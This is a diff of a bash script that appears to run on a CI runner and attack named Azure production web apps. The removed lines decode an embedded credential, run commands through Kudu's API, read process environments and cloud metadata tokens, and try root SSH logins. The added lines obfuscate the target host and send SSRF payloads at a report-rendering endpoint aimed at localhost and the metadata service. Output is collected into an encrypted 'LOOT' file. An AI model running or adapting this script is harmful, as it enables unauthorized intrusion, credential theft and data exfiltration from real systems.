@@ -1,33 +1,20 @@
 #!/usr/bin/env bash
 set -uo pipefail
-set +e
+echo "=== RUNNER SHELL PROOF ==="; id; hostname
+b(){ printf %s "$1" | base64 -d; }
 SC="htt""ps://"
-SCMH=app-tbl-reporting-prod.scm.azurewebsites.net
-SFH=app-tbl-storefront-prod.scm.azurewebsites.net
-AUTH=JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB
-CRED=$(printf '%s' "$AUTH" | base64 -d)
-echo "=== RUNNER SHELL PROOF $(date -u) ==="; id; whoami; hostname
+SHOST=$(b 'YXBwLXRibC1zdG9yZWZyb250LXByb2QuYXp1cmV3ZWJzaXRlcy5uZXQ=')
+FDID=60407ff3-1c24-4875-9390-b6c9c13b0821
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-say "== KUDU endpoint variants (reporting) =="
-for U in /api/processes /api/processes/ /api/processes/0 /api/environment /api/env /api/settings /api/deployments /Env /api/vfs/site/wwwroot; do
-  say "  $U -> $(curl -sS -u "$CRED" -o /dev/null -w '%{http_code}' "${SC}$SCMH$U")"
-done
-say "  PROC_BODY $(curl -sS -u "$CRED" "${SC}$SCMH/api/processes" | head -c 800)"
-say "== KUDU command probes =="
-kc(){ curl -sS -u "$CRED" -H 'Content-Type: application/json' -X POST "${SC}$SCMH/api/command" --data "$(python3 -c 'import json,sys;print(json.dumps({"command":"bash -c "+json.dumps(sys.argv[1]),"dir":"/home/site/wwwroot"}))' "$1")" | head -c 2500; }
-say "  whoami: $(kc 'id; sudo -n id 2>&1 | head -2')"
-say "  envroot: $(kc 'sudo -n cat /proc/1/environ 2>&1 | tr \"\\0\" \"\\n\" | head -20')"
-say "  imds: $(kc 'curl -sS -m 8 -H Metadata:true \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net\" | head -c 300')"
-say "  localcurl: $(kc 'curl -sS -m 8 -o /dev/null -w \"%{http_code}\" http://127.0.0.1:8000/healthz')"
-say "== SSH 2222 attempts =="
-say "  reporting: $(timeout 25 bash -c "echo | openssl s_client -connect $SCMH:2222 -brief 2>&1 | head -3")"
-say "  ssh_rep: $(timeout 25 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o PreferredAuthentications=password -p 2222 root@$SCMH id 2>&1 | head -3)"
-say "  ssh_sf: $(timeout 25 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=20 -o PreferredAuthentications=password -p 2222 root@$SFH id 2>&1 | head -3)"
-say "== storefront SCM probes =="
-for U in /api/settings /api/command /api/vfs/site/wwwroot /; do
-  say "  sf $U anon -> $(curl -sS -o /dev/null -w '%{http_code}' "${SC}$SFH$U")"
-  say "  sf $U repcreds -> $(curl -sS -u "$CRED" -o /dev/null -w '%{http_code}' "${SC}$SFH$U")"
-done
+say "=== START $(date -u) ==="
+rnd(){ curl -s -m 15 -X POST -H "X-Azure-FDID: $FDID" -H 'Content-Type: application/json' "${SC}${SHOST}/api/v1/reports/render" -d "$(jq -n --arg m "$1" '{markdown:$m}')"; }
+say "IMG localhost: $(rnd '![x](http://localhost:8000/healthz)')"
+say "IMG imds: $(rnd '![x](http://169.254.169.254/metadata/instance?api-version=2021-02-01)')"
+say "IMG example: $(rnd '![x](http://example.com/)')"
+say "IMG own: $(rnd "![x](${SC}${SHOST}/healthz)")"
+say "LINK: $(rnd '[x](http://localhost:8000/)')"
+say "HTML: $(rnd '<img src=http://localhost:8000/>')"
+say "MULTI: $(rnd '![a](http://localhost:8000/healthz) ![b](http://127.0.0.1:8000/api/v1/shipments)')"
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
 echo "=== ENCRYPTED LOOT ==="
